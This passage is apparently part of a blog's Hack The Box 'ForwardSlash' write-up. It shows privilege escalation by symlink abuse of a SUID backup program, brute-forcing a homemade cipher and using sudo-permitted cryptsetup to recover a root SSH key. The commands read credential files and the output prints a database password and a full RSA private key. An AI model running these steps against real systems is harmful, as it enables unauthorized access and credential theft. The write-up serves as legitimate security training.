+<span class="code-line">printf(&quot;ERROR: %s Does Not Exist or Is N&quot;..., &quot;9c71365535e44dc76d65bbcd1faaab14&quot;...ERROR: 9c71365535e44dc76d65bbcd1faaab14 Does Not Exist or Is Not Accessible By Me, Exiting...</span>
+<span class="code-line">)                                                             = 94</span>
+<span class="code-line">setuid(1001)                                                                                                                                     = 0</span>
+<span class="code-line">setgid(1001)                                                                                                                                     = 0</span>
+<span class="code-line">remove(&quot;9c71365535e44dc76d65bbcd1faaab14&quot;...)                                                                                                    = -1</span>
+<span class="code-line">+++ exited (status 0) +++</span>
+<span class="code-line"></code></pre></div>
+
+<p>With a simple combination of <code>grep</code> and <code>cut</code> we can extract the current filename
+used by the program:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>chiv@forwardslash:~$ /usr/bin/backup | grep ERROR | cut -d &#39; &#39; -f 2</span>
+<span class="code-line">705159512ab36c24a46aead527de7fb5</span>
+<span class="code-line"></code></pre></div>
+
+<p>We can then create a temporary folder and try to get the file <code>user.txt</code> in
+pain's homedir by creating a symlink with the name of the file used by the backup
+program and then read it.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>chiv@forwardslash:/tmp/lolo$ ln -s /home/pain/user.txt ./$(/usr/bin/backup | grep ERROR | cut -d &#39; &#39; -f 2)  &amp;&amp; /usr/bin/backup</span>
+<span class="code-line">----------------------------------------------------------------------</span>
+<span class="code-line">        Pain&#39;s Next-Gen Time Based Backup Viewer</span>
+<span class="code-line">        v0.1</span>
+<span class="code-line">        NOTE: not reading the right file yet,</span>
+<span class="code-line">        only works if backup is taken in same second</span>
+<span class="code-line">----------------------------------------------------------------------</span>
+<span class="code-line"></span>
+<span class="code-line">Current Time: 12:28:53</span>
+<span class="code-line">aec49cafdb7eec8710d3bdf623ac28f7</span>
+<span class="code-line"></code></pre></div>
+
+<p>We apply the same thing for the <code>config.php.bak</code> file in <code>/var/backup/</code> and get
+some database credentials.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>chiv@forwardslash:/tmp/lolo$ ln -s /var/backups/config.php.bak ./$(/usr/bin/backup | grep ERROR | cut -d &#39; &#39; -f 2)  &amp;&amp; /usr/bin/backup</span>
+<span class="code-line">----------------------------------------------------------------------</span>
+<span class="code-line">        Pain&#39;s Next-Gen Time Based Backup Viewer</span>
+<span class="code-line">        v0.1</span>
+<span class="code-line">        NOTE: not reading the right file yet,</span>
+<span class="code-line">        only works if backup is taken in same second</span>
+<span class="code-line">----------------------------------------------------------------------</span>
+<span class="code-line"></span>
+<span class="code-line">Current Time: 12:28:11</span>
+<span class="code-line">&lt;?php</span>
+<span class="code-line">/* Database credentials. Assuming you are running MySQL</span>
+<span class="code-line">server with default setting (user &#39;root&#39; with no password) */</span>
+<span class="code-line">define(&#39;DB_SERVER&#39;, &#39;localhost&#39;);</span>
+<span class="code-line">define(&#39;DB_USERNAME&#39;, &#39;pain&#39;);</span>
+<span class="code-line">define(&#39;DB_PASSWORD&#39;, &#39;db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704&#39;);</span>
+<span class="code-line">define(&#39;DB_NAME&#39;, &#39;site&#39;);</span>
+<span class="code-line"></span>
+<span class="code-line">/* Attempt to connect to MySQL database */</span>
+<span class="code-line">$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);</span>
+<span class="code-line"></span>
+<span class="code-line">// Check connection</span>
+<span class="code-line">if($link === false){</span>
+<span class="code-line">    die(&quot;ERROR: Could not connect. &quot; . mysqli_connect_error());</span>
+<span class="code-line">}</span>
+<span class="code-line">?&gt;</span>
+<span class="code-line"></code></pre></div>
+
+<p>This credentials allows us to connect as pain using SSH (we can grab the
+<code>user.txt</code> again).</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~/pown/htb_cache$ ssh pain@10.10.10.183</span>
+<span class="code-line">pain@10.10.10.183&#39;s password:</span>
+<span class="code-line">&lt;snip&gt;</span>
+<span class="code-line">pain@forwardslash:~$ cat user.txt</span>
+<span class="code-line">96628de4960f22df8f7006205a8fa0bf</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="getting-root">Getting root</h2>
+<p>In <code>pain</code> homefolder we also found a <code>note.txt</code> which disclose that some
+"important" file are encrypted using homemade crypto (<strong>never use homemade
+crypto</strong>).</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>pain@forwardslash:~$ cat note.txt</span>
+<span class="code-line">Pain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.</span>
+<span class="code-line"></span>
+<span class="code-line">-chiv</span>
+<span class="code-line"></code></pre></div>
+
+<p>The folder <code>encryptorinator</code> contains a scripts in order to encrypt and
+decrypt a message and an encrypted message. The <code>encrypter</code> script is the
+following:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span></span>
+<span class="code-line">    <span class="n">key</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">key</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">msg</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span></span>
+<span class="code-line">    <span class="k">for</span> <span class="n">char_key</span> <span class="ow">in</span> <span class="n">key</span><span class="p">:</span></span>
+<span class="code-line">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">)):</span></span>
+<span class="code-line">            <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span></span>
+<span class="code-line">                <span class="n">tmp</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char_key</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span></span>
+<span class="code-line">            <span class="k">else</span><span class="p">:</span></span>
+<span class="code-line">                <span class="n">tmp</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char_key</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span></span>
+<span class="code-line"></span>
+<span class="code-line">            <span class="k">while</span> <span class="n">tmp</span> <span class="o">&gt;</span> <span class="mi">255</span><span class="p">:</span></span>
+<span class="code-line">                <span class="n">tmp</span> <span class="o">-=</span> <span class="mi">256</span></span>
+<span class="code-line">            <span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span></span>
+<span class="code-line">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span></span>
+<span class="code-line">    <span class="n">key</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">key</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">msg</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span></span>
+<span class="code-line">    <span class="k">for</span> <span class="n">char_key</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">key</span><span class="p">):</span></span>
+<span class="code-line">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">))):</span></span>
+<span class="code-line">            <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span></span>
+<span class="code-line">                <span class="n">tmp</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char_key</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span></span>
+<span class="code-line">            <span class="k">else</span><span class="p">:</span></span>
+<span class="code-line">                <span class="n">tmp</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char_key</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span></span>
+<span class="code-line">            <span class="k">while</span> <span class="n">tmp</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span></span>
+<span class="code-line">                <span class="n">tmp</span> <span class="o">+=</span> <span class="mi">256</span></span>
+<span class="code-line">            <span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span></span>
+<span class="code-line">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="nb">print</span> <span class="n">encrypt</span><span class="p">(</span><span class="s1">&#39;REDACTED&#39;</span><span class="p">,</span> <span class="s1">&#39;REDACTED&#39;</span><span class="p">)</span></span>
+<span class="code-line"><span class="nb">print</span> <span class="n">decrypt</span><span class="p">(</span><span class="s1">&#39;REDACTED&#39;</span><span class="p">,</span> <span class="n">encrypt</span><span class="p">(</span><span class="s1">&#39;REDACTED&#39;</span><span class="p">,</span> <span class="s1">&#39;REDACTED&#39;</span><span class="p">))</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>The key can quickly be brute force with a quick script including the <code>decrypt</code>
+function and looking for some "classic" English words in the decrypted text.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span></span>
+<span class="code-line">    <span class="n">key</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">key</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">msg</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span></span>
+<span class="code-line">    <span class="k">for</span> <span class="n">char_key</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">key</span><span class="p">):</span></span>
+<span class="code-line">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">))):</span></span>
+<span class="code-line">            <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span></span>
+<span class="code-line">                <span class="n">tmp</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char_key</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span></span>
+<span class="code-line">            <span class="k">else</span><span class="p">:</span></span>
+<span class="code-line">                <span class="n">tmp</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char_key</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span></span>
+<span class="code-line">            <span class="k">while</span> <span class="n">tmp</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span></span>
+<span class="code-line">                <span class="n">tmp</span> <span class="o">+=</span> <span class="mi">256</span></span>
+<span class="code-line">            <span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span></span>
+<span class="code-line">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">ciphertext</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;ciphertext&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span></span>
+<span class="code-line"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">165</span><span class="p">):</span></span>
+<span class="code-line">  <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span><span class="mi">127</span><span class="p">):</span></span>
+<span class="code-line">    <span class="n">key</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">*</span> <span class="n">i</span></span>
+<span class="code-line">    <span class="n">msg</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">)</span></span>
+<span class="code-line">    <span class="k">if</span> <span class="s1">&#39;the &#39;</span> <span class="ow">in</span> <span class="n">msg</span> <span class="ow">or</span> <span class="s1">&#39;be &#39;</span> <span class="ow">in</span> <span class="n">msg</span> <span class="ow">or</span> <span class="s1">&#39;and &#39;</span> <span class="ow">in</span> <span class="n">msg</span> <span class="ow">or</span> <span class="s1">&#39;of &#39;</span> <span class="ow">in</span> <span class="n">msg</span> <span class="p">:</span></span>
+<span class="code-line">      <span class="n">exit</span><span class="p">(</span><span class="s2">&quot;Key: </span><span class="si">{0}</span><span class="s2">, Key length: </span><span class="si">{1}</span><span class="s2">, Msg: </span><span class="si">{2}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">),</span> <span class="n">msg</span><span class="p">))</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>Running the script give the following result:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$ python2 decode.py</span>
+<span class="code-line">Key: ttttttttttttttttt, Key length: 17, Msg: Hlô¿vFÞ;©¨ºÒÀî&amp;you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf</span>
+<span class="code-line"></code></pre></div>
+
+<p><em>Note: there seems to be some flow in the encryption as every key starting with
+<code>t</code> and 17 characters long will decrypt the message. I modified the script to
+use a fixed key:</em></p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$ python2 decode.py</span>
+<span class="code-line">Key: t2345678901234567, Key length: 17, Msg: HdD.ÛÄçáp޺¿éyou liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf</span>
+<span class="code-line"></code></pre></div>
+
+<p>We look at our <code>sudo</code> permission. We can run a few commands as root without
+password mostly <code>/sbin/cryptsetup luksOpen</code> that allow to open a LUKS encrypted
+image.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>pain@forwardslash:~$ sudo -l</span>
+<span class="code-line">Matching Defaults entries for pain on forwardslash:</span>
+<span class="code-line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>
+<span class="code-line"></span>
+<span class="code-line">User pain may run the following commands on forwardslash:</span>
+<span class="code-line">    (root) NOPASSWD: /sbin/cryptsetup luksOpen *</span>
+<span class="code-line">    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/</span>
+<span class="code-line">    (root) NOPASSWD: /bin/umount ./mnt/</span>
+<span class="code-line"></code></pre></div>
+
+<p>With the passphrase and our <code>sudo</code> permission we can easily open the
+<code>encrypted_backup.img</code> image which contain a RSA private key.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>pain@forwardslash:/tmp/plop$ mkdir mnt</span>
+<span class="code-line">pain@forwardslash:/tmp/plop$ sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup</span>
+<span class="code-line">Enter passphrase for /var/backups/recovery/encrypted_backup.img:</span>
+<span class="code-line">pain@forwardslash:/tmp/plop$ sudo /bin/mount /dev/mapper/backup ./mnt/</span>
+<span class="code-line">pain@forwardslash:/tmp/plop$ ls mnt/</span>
+<span class="code-line">id_rsa</span>
+<span class="code-line">pain@forwardslash:/tmp/plop$ cat mnt/id_rsa</span>
+<span class="code-line">-----BEGIN RSA PRIVATE KEY-----</span>
+<span class="code-line">MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK</span>
+<span class="code-line">RKh+WDykv/gukvUSauxWJndPq3F1Ck0xbcGQu6+1OBYb+fQ0B8raCRjwtwYF4gaf</span>
+<span class="code-line">yLFcOS111mKmUIB9qR1wDsmKRbtWPPPvgs2ruafgeiHujIEkiUUk9f3WTNqUsPQc</span>
+<span class="code-line">u2AG//ZCiqKWcWn0CcC2EhWsRQhLOvh3pGfv4gg0Gg/VNNiMPjDAYnr4iVg4XyEu</span>
+<span class="code-line">NWS2x9PtPasWsWRPLMEPtzLhJOnHE3iVJuTnFFhp2T6CtmZui4TJH3pij6wYYis9</span>
+<span class="code-line">MqzTmFwNzzx2HKS2tE2ty2c1CcW+F3GS/rn0EQIDAQABAoIBAQCPfjkg7D6xFSpa</span>
+<span class="code-line">V+rTPH6GeoB9C6mwYeDREYt+lNDsDHUFgbiCMk+KMLa6afcDkzLL/brtKsfWHwhg</span>
+<span class="code-line">G8Q+u/8XVn/jFAf0deFJ1XOmr9HGbA1LxB6oBLDDZvrzHYbhDzOvOchR5ijhIiNO</span>
+<span class="code-line">3cPx0t1QFkiiB1sarD9Wf2Xet7iMDArJI94G7yfnfUegtC5y38liJdb2TBXwvIZC</span>
+<span class="code-line">vROXZiQdmWCPEmwuE0aDj4HqmJvnIx9P4EAcTWuY0LdUU3zZcFgYlXiYT0xg2N1p</span>
+<span class="code-line">MIrAjjhgrQ3A2kXyxh9pzxsFlvIaSfxAvsL8LQy2Osl+i80WaORykmyFy5rmNLQD</span>
+<span class="code-line">Ih0cizb9AoGBAP2+PD2nV8y20kF6U0+JlwMG7WbV/rDF6+kVn0M2sfQKiAIUK3Wn</span>
+<span class="code-line">5YCeGARrMdZr4fidTN7koke02M4enSHEdZRTW2jRXlKfYHqSoVzLggnKVU/eghQs</span>
+<span class="code-line">V4gv6+cc787HojtuU7Ee66eWj0VSr0PXjFInzdSdmnd93oDZPzwF8QUnAoGBAPhg</span>
+<span class="code-line">e1VaHG89E4YWNxbfr739t5qPuizPJY7fIBOv9Z0G+P5KCtHJA5uxpELrF3hQjJU8</span>
+<span class="code-line">6Orz/0C+TxmlTGVOvkQWij4GC9rcOMaP03zXamQTSGNROM+S1I9UUoQBrwe2nQeh</span>
+<span class="code-line">i2B/AlO4PrOHJtfSXIzsedmDNLoMqO5/n/xAqLAHAoGATnv8CBntt11JFYWvpSdq</span>
+<span class="code-line">tT38SlWgjK77dEIC2/hb/J8RSItSkfbXrvu3dA5wAOGnqI2HDF5tr35JnR+s/JfW</span>
+<span class="code-line">woUx/e7cnPO9FMyr6pbr5vlVf/nUBEde37nq3rZ9mlj3XiiW7G8i9thEAm471eEi</span>
+<span class="code-line">/vpe2QfSkmk1XGdV/svbq/sCgYAZ6FZ1DLUylThYIDEW3bZDJxfjs2JEEkdko7mA</span>
+<span class="code-line">1DXWb0fBno+KWmFZ+CmeIU+NaTmAx520BEd3xWIS1r8lQhVunLtGxPKvnZD+hToW</span>
+<span class="code-line">J5IdZjWCxpIadMJfQPhqdJKBR3cRuLQFGLpxaSKBL3PJx1OID5KWMa1qSq/EUOOr</span>
+<span class="code-line">OENgOQKBgD/mYgPSmbqpNZI0/B+6ua9kQJAH6JS44v+yFkHfNTW0M7UIjU7wkGQw</span>
+<span class="code-line">ddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo</span>
+<span class="code-line">ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o</span>
+<span class="code-line">-----END RSA PRIVATE KEY-----</span>
+<span class="code-line"></code></pre></div>
+
+<p>With the private key we can directly connect as <code>root</code> to the local machine and get
+the <code>root.txt</code> flag:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>pain@forwardslash:/tmp/plop$ ssh root@localhost -i mnt/id_rsa</span>
+<span class="code-line">&lt;snip&gt;</span>
+<span class="code-line">root@forwardslash:~# cat root.txt</span>
+<span class="code-line">419f9c340fcc83acccfcbebfe17d2538</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>This box was hard. I don't usually do the hard box as they take so much time.
+This one was long and I ask a few questions on the discord channel to avoid
+taking too much time on rabbit hole. Nevertheless the box feels good.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="../../2020/06/htb-servmon.html"> HTB: ServMon </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="../../2020/07/htb-book.html"> HTB: Book </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-3">
+              <a href="../../tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nmap.html">nmap</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/jackson.html">jackson</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/javascript.html">javascript</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/webassembly.html">webassembly</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/laravel.html">laravel</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/deserialization.html">deserialization</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/php.html">php</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/core-dump.html">core dump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chef.html">chef</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adb.html">adb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/path.html">PATH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/msfconsole.html">msfconsole</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xxe.html">XXE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/php-filter.html">php filter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/yaml.html">YAML</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nft.html">NFT</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/print-nightmare.html">print nightmare</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/capabilities.html">capabilities</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/devops.html">devops</a>
+            </li>
